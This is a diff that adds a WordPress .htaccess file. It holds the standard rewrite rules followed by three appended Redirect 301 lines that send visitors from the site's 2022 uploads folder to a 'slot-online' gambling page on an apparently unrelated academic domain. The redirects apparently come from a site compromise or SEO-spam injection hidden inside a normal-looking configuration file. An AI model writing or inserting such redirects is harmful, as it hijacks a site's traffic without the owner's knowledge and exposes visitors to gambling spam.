@@ -1,0 +1,14 @@
+# BEGIN WordPress 
+ 
+RewriteEngine On 
+RewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}] 
+RewriteBase / 
+RewriteRule ^index\.php$ - [L] 
+RewriteCond %{REQUEST_FILENAME} !-f 
+RewriteCond %{REQUEST_FILENAME} !-d 
+RewriteRule . /index.php [L] 
+Redirect 301 /wp-content/uploads/2022/ http://thailocalwisdom.edu.ku.ac.th/-/slot-online/ 
+Redirect 301 /wp-content/uploads/2022/index.html http://thailocalwisdom.edu.ku.ac.th/-/slot-online/ 
+Redirect 301 /wp-content/uploads/2022/index.php http://thailocalwisdom.edu.ku.ac.th/-/slot-online/ 
+ 
+# END WordPress
